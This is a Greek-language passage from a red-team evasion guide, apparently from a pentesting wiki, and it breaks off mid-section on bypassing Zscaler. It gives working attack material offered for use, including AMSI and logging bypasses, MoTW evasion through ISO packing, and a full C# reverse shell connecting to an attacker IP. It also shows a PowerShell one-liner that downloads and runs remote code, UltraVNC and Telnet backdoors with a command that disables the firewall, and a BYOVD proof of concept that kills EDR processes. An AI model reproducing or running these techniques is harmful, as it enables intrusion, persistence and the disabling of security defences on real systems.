PowerShell logging είναι μια λειτουργία που σας επιτρέπει να καταγράφετε όλες τις PowerShell εντολές που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για έλεγχο και αντιμετώπιση προβλημάτων, αλλά μπορεί επίσης να αποτελέσει ένα **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Εάν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawn ένα powershell χωρίς defenses (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum οπότε οποιαδήποτε αλλαγή θα προκαλέσει crash του binary. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε το δικό σας unpacker.

2.  Symbol / control-flow recovery – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τα constant strings.

3.  Proxy-call stripping – Το ConfuserEx αντικαθιστά τις άμεσες κλήσεις με lightweight wrappers (a.k.a *proxy calls*) για να δυσκολέψει περαιτέρω την αποσυμπίληση. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το παραγόμενο binary στο dnSpy, ψάξτε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα σε `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** την ανάγκη να τρέξετε το malicious δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη ταξινόμηση samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα open-source fork της σουίτας [LLVM](http://www.llvm.org/) μεταγλώττισης ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstratεs πώς να χρησιμοποιήσετε τη γλώσσα `C++11/14` για να παράγετε, κατά το χρόνο μεταγλώττισης, obfuscated code χωρίς τη χρήση οποιουδήποτε εξωτερικού εργαλείου και χωρίς να τροποποιήσετε τον compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που δημιουργούνται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator που είναι ικανός να obfuscate διάφορα διαφορετικά PE αρχεία συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages χρησιμοποιώντας ROP (return-oriented programming). ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετασχηματίζοντας κανονικές εντολές σε ROP chains, δυσχεραίνοντας την φυσική μας αντίληψη της κανονικής control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχετε δει αυτήν την οθόνη όταν κατεβάζετε κάποια εκτελέσιμα αρχεία από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που αποσκοπεί να προστατέψει τον τελικό χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές που δεν κατεβαίνουν συχνά θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και εμποδίζοντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier που δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα αρχεία υπογεγραμμένα με ένα **έμπιστο** πιστοποιητικό υπογραφής **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να λάβουν το Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε **μη NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε output containers για να αποφύγει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για να παρακολουθούν και να ανιχνεύουν κακόβουλες δραστηριότητες.

Παρόμοια με τον τρόπο που απενεργοποιείται (παρακάμπτεται) η AMSI, είναι επίσης δυνατό να κάνουμε τη συνάρτηση χρήστη-space **`EtwEventWrite`** να επιστρέφει αμέσως χωρίς να καταγράφει κανένα συμβάν. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη ώστε να επιστρέφει άμεσα, ουσιαστικά απενεργοποιώντας την καταγραφή ETW για αυτή τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέξετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα πρέπει μόνο να ανησυχήσουμε για το patching της AMSI για όλη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελέσουν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Περιλαμβάνει **την εκκίνηση μιας νέας θυσιαστικής διεργασίας**, την έγχυση του post-exploitation κακόβουλου κώδικα σας σε αυτή τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και όταν τελειώσει, την τερματισμό της νέας διεργασίας. Αυτό έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση συμβαίνει **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι αν κάτι πάει στραβά ή εντοπιστεί στη δράση post-exploitation, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant να επιβιώσει.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **ανιχνεύσεις συμπεριφοράς**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την έγχυση του post-exploitation κακόβουλου κώδικα **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμά της από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **from PowerShell**, ρίξτε μια ματιά σε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και στο [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στο συμβιβασμένο μηχάνημα πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες εντός της μνήμης** του συμβιβασμένου μηχανήματος.

Το repo αναφέρει: Defender εξακολουθεί να σκανάρει τα scripts αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-οβεφυσκαρισμένα reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχημένες.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **χειραγωγήσει το access token ή ένα security product όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges έτσι ώστε η διεργασία να μην τερματιστεί αλλά να μην έχει τα δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

Για να αποτρέψει αυτό τα Windows θα μπορούσαν να **αποτρέψουν εξωτερικές διεργασίες** από το να λαμβάνουν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε απλά το Chrome Remote Desktop σε έναν υπολογιστή θύμα και στη συνέχεια να το χρησιμοποιήσετε για να αναλάβετε τον έλεγχο και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε το παράμετρο pin που επιτρέπει τον ορισμό του pin χωρίς να χρησιμοποιήσετε το GUI).

## Advanced Evasion

Η παράκαμψη (evasion) είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αθέατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που θα αντιμετωπίσετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Συστήνω να παρακολουθήσετε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη επαφή με πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί μέρη του binary** μέχρι να **βρει ποιο μέρος ο Defender** θεωρεί κακόβουλο και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει το **ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ρύθμισέ το να **ξεκινά** όταν ξεκινά το σύστημα και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε telnet port** (stealth) και απενεργοποιήστε firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στον **host** του το binary `vncviewer.exe -listen 5900` ώστε να είναι **προετοιμασμένος** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Ξεκινήστε το daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη διακριτικότητα πρέπει να μην κάνετε τα εξής

- Μην ξεκινήσετε `winvnc` αν τρέχει ήδη ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε `winvnc` χωρίς `UltraVNC.ini` στον ίδιο κατάλογο ή θα εμφανιστεί [το config window](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρήση μεταγλωττιστή
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Η Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει προστασίες endpoint πριν από το dropping του ransomware. Το εργαλείο φέρνει τον δικό του **ευπαθή αλλά *signed* driver** και τον εκμεταλλεύεται για να εκτελέσει προνομιούχες λειτουργίες στο kernel που ακόμη και Protected-Process-Light (PPL) AV services δεν μπορούν να μπλοκάρουν.

Key take-aways
1. **Signed driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον ξεκινά ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός αυθαίρετης διεργασίας με PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγραφή αυθαίρετου αρχείου στο δίσκο |
| `0x990001D0` | Αποφόρτωση του driver και αφαίρεση της υπηρεσίας |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD παρακάμπτει εντελώς τις user-mode προστασίες· κώδικας που εκτελείται στο kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να τροποποιήσει kernel αντικείμενα ανεξαρτήτως PPL/PP, ELAM ή άλλων μηχανισμών ενίσχυσης ασφαλείας.

Detection / Mitigation
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευπαθών drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.  
•  Παρακολουθήστε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο με write δικαιώματα για όλους ή δεν υπάρχει στη λίστα επιτρεπόμενων.  
•  Εντοπίστε user-mode handles προς custom device objects ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το Zscaler’s **Client Connector** εφαρμόζει κανόνες device-posture τοπικά και βασίζεται στο Windows RPC για να επικοινωνήσει τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:

